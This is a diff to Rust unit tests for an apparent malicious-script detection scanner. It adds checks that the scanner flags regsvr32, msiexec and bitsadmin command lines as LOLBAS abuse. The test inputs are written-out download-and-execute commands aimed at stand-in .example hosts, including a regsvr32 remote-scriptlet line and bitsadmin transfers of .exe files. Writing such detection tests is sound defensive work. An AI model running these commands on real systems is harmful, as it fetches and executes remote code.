@@ -18667,16 +18667,21 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn regsvr32_scriptlet_url_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "http://regsvr32-scriptlet.example/payload.sct";
-        crate::deob_scan::scan_deob_text(
-            &format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#),
-            &mut env,
-        );
+        let line = format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::UrlArgument { url: got, .. } if got == url
             )
         });
         assert!(has, "regsvr32 scriptlet URL not typed: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "regsvr32" && cmd == &line)
+            ),
+            "regsvr32 scriptlet URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
         assert!(
             !env.traits
                 .iter()
@@ -18760,13 +18765,21 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     fn msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-package.example/setup.msi";
-        crate::deob_scan::scan_deob_text(&format!(r#"msiexec /quiet /i "{url}""#), &mut env);
+        let line = format!(r#"msiexec /quiet /i "{url}""#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         let has = env.traits.iter().any(|t| {
             matches!(t,
                 Trait::UrlArgument { url: got, .. } if got == url
             )
         });
         assert!(has, "msiexec package URL not typed: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "msiexec" && cmd == &line)
+            ),
+            "msiexec package URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
         assert!(
             !env.traits
                 .iter()
@@ -19230,10 +19243,8 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     #[test]
     fn bitsadmin_transfer_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
-        crate::deob_scan::scan_deob_text(
-            r#"bitsadmin /transfer j1 /download /priority foreground "https://bits.example/a.txt" "C:\Temp\a.exe" "https://bits.example/b.txt" "C:\Temp\b.exe""#,
-            &mut env,
-        );
+        let line = r#"bitsadmin /transfer j1 /download /priority foreground "https://bits.example/a.txt" "C:\Temp\a.exe" "https://bits.example/b.txt" "C:\Temp\b.exe""#;
+        crate::deob_scan::scan_deob_text(line, &mut env);
         for expected in ["https://bits.example/a.txt", "https://bits.example/b.txt"] {
             let has = env.traits.iter().any(|t| {
                 matches!(t,
@@ -19246,6 +19257,13 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 env.traits
             );
         }
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == line)
+            ),
+            "bitsadmin transfer not marked as LOLBAS in deob text: {:?}",
+            env.traits
+        );
         let generic_count = env
             .traits
             .iter()
